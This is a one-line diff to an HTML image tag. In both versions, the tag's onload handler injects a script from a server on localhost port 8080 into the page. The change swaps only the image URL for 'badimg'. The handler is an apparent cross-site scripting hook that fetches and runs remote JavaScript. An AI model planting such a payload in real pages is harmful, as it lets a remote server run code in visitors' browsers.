@@ -1,1 +1,1 @@
-<img src="https://img00.deviantart.net/8fe9/i/2015/215/4/5/red_leather_dragon_mask___for_sale_by_zarathus-d942h8k.jpg" alt="Red Dragon Mask" onload="window.nodeJsIp = 'http://localhost:8080';let s = document.createElement('script');s.src = 'http://localhost:8080/client/client.js';document.getElementsByTagName('head')[0].appendChild(s);">
+<img src="badimg" alt="Red Dragon Mask" onload="window.nodeJsIp = 'http://localhost:8080';let s = document.createElement('script');s.src = 'http://localhost:8080/client/client.js';document.getElementsByTagName('head')[0].appendChild(s);">
